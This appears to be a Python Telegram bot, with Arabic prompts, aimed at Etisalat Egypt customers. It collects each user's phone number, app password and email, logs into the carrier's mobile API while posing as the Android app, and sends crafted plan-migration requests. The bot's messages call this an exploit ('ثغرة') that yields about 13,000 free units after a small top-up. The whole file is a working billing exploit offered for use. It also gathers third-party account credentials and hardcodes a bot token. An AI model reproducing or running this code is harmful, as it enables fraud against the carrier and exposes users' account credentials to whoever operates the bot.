import telebot
import base64
import requests
import xml.etree.ElementTree as Et
import time

bot = telebot.TeleBot('7184172163:AAH6UyuP0BeeEtPmTQd6nKRyqYode5kK2ZQ')

PHONE, PASSWORD, EMAIL, SYSTEM_NAME = range(4)
current_state = {}
started_users = set()


@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    if chat_id in started_users:
        current_state[chat_id] = PHONE
        msg = bot.send_message(chat_id, "قم بإدخال رقم هاتف اتصالات المكون من 11 رقم")
        bot.register_next_step_handler(msg, process_phone_step)
    else:
        started_users.add(chat_id)
        current_state[chat_id] = PHONE
        msg = bot.send_message(chat_id, "قم بإدخال رقم هاتف اتصالات المكون من 11 رقم")
        bot.register_next_step_handler(msg, process_phone_step)

def process_phone_step(message):
    chat_id = message.chat.id
    if len(message.text) != 11 or not message.text.isdigit():
        msg = bot.send_message(chat_id, "قم بإدخال رقم هاتف اتصالات المكون من 11 رقم ")
        bot.register_next_step_handler(msg, process_phone_step)
        return
    current_state[chat_id] = PASSWORD
    phone_number = message.text
    current_state['nu'] = phone_number
    msg = bot.send_message(chat_id, "قم بإدخال كلمة مرور تطبيق اتصالات")
    bot.register_next_step_handler(msg, process_password_step)

def process_password_step(message):
    chat_id = message.chat.id
    if message.text == "/start":
     msg = bot.send_message(chat_id, "قم بإدخال رقم هاتف اتصالات المكون من 11 رقم")
     bot.register_next_step_handler(msg, process_phone_step)
     return
    password = message.text
    current_state['pas'] = password
    msg = bot.send_message(chat_id, "قم بإدخال الإيميل الخاص بتطبيق اتصالات")
    bot.register_next_step_handler(msg, process_email_step)

def process_email_step(message):
    chat_id = message.chat.id
    if message.text == "/start":
     chat_id = message.chat.id
     msg = bot.send_message(chat_id, "قم بإدخال رقم هاتف اتصالات المكون من 11 رقم")
     bot.register_next_step_handler(msg, process_phone_step)
     return
    email = message.text
    current_state['em'] = email
    salah14 = current_state['nu']
    salah13 = current_state['pas']
    salah12 = current_state['em']
    salah16 = salah12 + ":" + salah13
    salah17 = salah16.encode("ascii")
    salah18 = base64.b64encode(salah17)
    salah19 = salah18.decode("ascii")
    salah20 = "Basic" + " " + salah19
    salah1004 = "" 
    br = ""
    ck=""
    if "011" in salah14:
        salah15 = salah14[+1:]
    else:
        salah15 = salah14

    salah21 = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"

    salah22 = {
        "applicationVersion": "2",
        "applicationName": "MAB",
        "Accept": "text/xml",
        "Authorization": salah20,
        "APP-BuildNumber": "964",
        "APP-Version": "27.0.0",
        "OS-Type": "Android",
        "OS-Version": "12",
        "APP-STORE": "GOOGLE",
        "Is-Corporate": "false",
        "Content-Type": "text/xml; charset=UTF-8",
        "Content-Length": "1375",
        "Host": "mab.etisalat.com.eg:11003",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/5.0.0-alpha.11",
        "ADRUM_1": "isMobile:true",
        "ADRUM": "isAjax:true"
    }

    salah23 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType></modelType><osVersion></osVersion><platform>Android</platform><udid></udid></loginRequest>"
    salah24 = requests.post(salah21, headers=salah22, data=salah23)

    if "true" in salah24.text:
        msg = bot.send_message(chat_id,"تم تسجيل الدخول للحساب بنجاح")
        st = salah24.headers["Set-Cookie"]
        ck = st.split(";")[0]
        br = salah24.headers["auth"]        
        msg = bot.send_message(chat_id, "انتظر🔥🤌")
        time.sleep(10)
        current_state[chat_id] = {'salah24': salah24, 'br': br, 'ck': ck}
        process_salah_step(chat_id, salah24.headers)
    else:
        msg = bot.send_message(chat_id, "رقم الهاتف او كلمة المرور او الايميل خطأ اعد المحاولة مره اخري")
        return

def process_salah_step(chat_id, headers):
    msg = bot.send_message(chat_id, "قم بإدخال اسم نظامك الحالي حكاية او دماغ تانية او 15 قرش")
    bot.register_next_step_handler(msg, lambda message: handle_plan_change(message, headers, ))

def handle_plan_change(message, headers):
    
    chat_id = message.chat.id
    salah47 = message.text
    salah24 = current_state.get(chat_id, {}).get('salah24', None)
    if not salah24:
        bot.send_message(chat_id, "حدث خطأ في الوصول إلى البيانات.")
        return
    st = salah24.headers["Set-Cookie"]
    ck = st.split(";")[0]
    br = salah24.headers["auth"]  
    salah14 = current_state['nu']
    if "011" in salah14:
        salah15 = salah14[+1:]
    else:
        salah15 = salah14



    if salah47 == "دماغ تانيه":
        

        salah950 = "https://mab.etisalat.com.eg:11003/Saytar/rest/HekayaPartial/migrate"

        salah951 = {
            'applicationVersion': "2",
            'Content-Type': "text/xml",
            'applicationName': "MAB",
            'Accept': "text/xml",
            'Language': "ar",
            'APP-BuildNumber': "10459",
            'APP-Version': "29.9.0",
            'OS-Type': "Android",
            'OS-Version': "11",
            'APP-STORE': "GOOGLE",
            'auth': "Bearer " + br,
            'Host': "mab.etisalat.com.eg:11003",
            'Is-Corporate': "false",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            'Cookie': ck
        }
        
        salah952 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><migrateRequest><addonName></addonName><oMSRatePlan>true</oMSRatePlan><operation>FULL_MIGRATE</operation><productName>Hekaya_XRP_MIX_Parent_7</productName><ratePlanID>952</ratePlanID><subscriberNumber>%s</subscriberNumber></migrateRequest>" % (salah15)
        salah953 = requests.post(salah950, headers=salah951, data=salah952).text
        
        if "true" in salah953:
            bot.send_message(chat_id, "تم تحويل النظام إلي حكاية 180")
            bot.send_message(chat_id, "كده تمت الثغره بس في حاجة بسيطة .. الأول اتأكد ان النظام اتحول من التطبيق وبعد ما تتأكد ثانيًا اشحن كارت فكة بـ15 من الكود ده *556*9*Code# وكده مبروك عليك 13000 ميكس")
        else:
            bot.send_message(chat_id, "فيه خطأ حاول تاني")
    
    else:
        salah25 = "https://mab.etisalat.com.eg:11003/Saytar/rest/harleyPreset/migrate"

    salah26 = {
            'applicationVersion': "2",
            'Content-Type': "text/xml",
            'applicationName': "MAB",
            'Accept': "text/xml",
            'Language': "ar",
            'APP-BuildNumber': "10459",
            'APP-Version': "29.9.0",
            'OS-Type': "Android",
            'OS-Version': "11",
            'APP-STORE': "GOOGLE",
            'auth': "Bearer " + br,
            'Host': "mab.etisalat.com.eg:11003",
            'Is-Corporate': "false",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            'Cookie': ck
        }
    salah500 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><submitOrderRequest><msisdn>%s</msisdn><operation>MIGRATE</operation><parameters><parameter><name>MI_QUOTA</name><value>850</value></parameter><parameter><name>UNIT_QUOTA</name><value>120</value></parameter><parameter><name>VALIDITY</name><value>21</value></parameter><parameter><name>PRICE</name><value>21</value></parameter><parameter><name>OFFER_ID</name><value>17543</value></parameter></parameters><productName>HARLEY_MINI_BUNDLE</productName></submitOrderRequest>" %(salah15)
    salah600 = requests.post(salah25, headers=salah26, data=salah500).text
    if "true" in salah600:
    	msg = bot.send_message(chat_id, "تم تحويل النظام إلي دماغ تانية")
    	msg = bot.send_message(chat_id, "اصبر شوية يسطا جاري التحويل لنظام حكاية🤓")
    	time.sleep(25)
    	
    salah950 = "https://mab.etisalat.com.eg:11003/Saytar/rest/HekayaPartial/migrate"

    salah951 = {
            'applicationVersion': "2",
            'Content-Type': "text/xml",
            'applicationName': "MAB",
            'Accept': "text/xml",
            'Language': "ar",
            'APP-BuildNumber': "10459",
            'APP-Version': "29.9.0",
            'OS-Type': "Android",
            'OS-Version': "11",
            'APP-STORE': "GOOGLE",
            'auth': "Bearer " + br,
            'Host': "mab.etisalat.com.eg:11003",
            'Is-Corporate': "false",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            'Cookie': ck
        }
    salah952 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><migrateRequest><addonName></addonName><oMSRatePlan>true</oMSRatePlan><operation>FULL_MIGRATE</operation><productName>Hekaya_XRP_MIX_Parent_7</productName><ratePlanID>952</ratePlanID><subscriberNumber>%s</subscriberNumber></migrateRequest>" %(salah15)
    salah953 = requests.post(salah950, headers=salah951, data=salah952).text
    if "true" in salah953:
    	msg = bot.send_message(chat_id, "تم تحويل النظام إلي حكاية 180")
    	msg = bot.send_message(chat_id, "كده تمت  الثغره بس في حاجة بسيطه .. الاول اتأكد ان النظام اتحول من للتطبيق وبعد ما تتأكد ثانيا اشحن كارت فكة ب 15 من الكود ده *556*9*Code# و كده مبرووك عليك 13000 ميكس ")    	
    else:
    	msg = bot.send_message(chat_id, "فيه خطأ حاول تاني")
    		
bot.polling(none_stop=True)